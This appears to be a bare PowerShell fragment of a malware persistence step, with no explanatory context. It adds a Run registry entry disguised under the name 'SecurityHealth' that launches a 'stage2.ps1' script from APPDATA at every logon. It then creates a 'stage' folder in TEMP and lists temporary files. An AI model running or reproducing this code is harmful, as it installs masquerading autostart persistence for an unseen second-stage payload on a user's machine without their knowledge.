
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "SecurityHealth" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\stage2.ps1" + '"') -PropertyType String -Force
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
